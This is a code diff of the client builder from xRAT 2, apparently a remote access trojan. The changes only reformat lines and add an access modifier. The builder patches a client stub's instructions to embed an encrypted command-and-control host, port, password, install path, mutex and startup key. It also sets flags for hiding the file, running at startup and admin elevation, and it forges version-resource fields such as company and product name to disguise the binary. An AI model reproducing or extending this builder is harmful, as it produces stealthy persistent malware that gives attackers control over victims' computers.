@@ -8,9 +8,11 @@ using xRAT_2.Settings;
 
 namespace Core.Build
 {
-    class ClientBuilder
+    internal class ClientBuilder
     {
-        public static void Build(string output, string host, string password, string installsub, string installname, string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay, int installpath, bool adminelevation, string iconpath, string[] asminfo)
+        public static void Build(string output, string host, string password, string installsub, string installname,
+            string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay,
+            int installpath, bool adminelevation, string iconpath, string[] asminfo)
         {
             // PHASE 1 - Settings
             string encKey = Helper.GetRandomName(20);
@@ -33,7 +35,8 @@ namespace Core.Build
                                     switch (strings)
                                     {
                                         case 1: //version
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(Application.ProductVersion, encKey);
+                                            methodDef.Body.Instructions[i].Operand =
+                                                AES.Encrypt(Application.ProductVersion, encKey);
                                             break;
                                         case 2: //ip/hostname
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(host, encKey);
@@ -59,7 +62,8 @@ namespace Core.Build
                                     }
                                     strings++;
                                 }
-                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.1" || methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.0") // bool
+                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.1" ||
+                                         methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.0") // bool
                                 {
                                     switch (bools)
                                     {
@@ -73,7 +77,8 @@ namespace Core.Build
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(hidefile));
                                             break;
                                         case 4: //AdminElevation
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(adminelevation));
+                                            methodDef.Body.Instructions[i] =
+                                                Instruction.Create(BoolOpcode(adminelevation));
                                             break;
                                     }
                                     bools++;
@@ -119,7 +124,7 @@ namespace Core.Build
                 versionResource.ProductVersion = asminfo[6];
                 versionResource.Language = 0;
 
-                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
+                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
                 stringFileInfo["CompanyName"] = asminfo[2];
                 stringFileInfo["FileDescription"] = asminfo[1];
                 stringFileInfo["ProductName"] = asminfo[0];
